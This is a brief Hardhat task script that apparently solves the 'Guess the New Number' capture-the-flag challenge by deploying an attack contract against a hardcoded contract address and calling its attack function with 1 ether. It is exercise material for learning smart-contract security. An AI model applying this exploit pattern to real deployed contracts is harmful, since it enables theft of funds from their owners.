import { utils } from "ethers";
import { task } from "hardhat/config";

const contractAddress = "0x17b7d432390Fb65F4DebA5827fe92E199F353506";

task("guess-the-new-number", "Solves the 'Guess the New Number' challenge", async (_taskArgs, hre) => {
  const factory = await hre.ethers.getContractFactory("GuessTheNewNumberAttack");
  const contract = await factory.deploy(contractAddress);
  await contract.deployed();

  const tx = await contract.attack({ value: utils.parseEther("1") });
  await tx.wait();
});
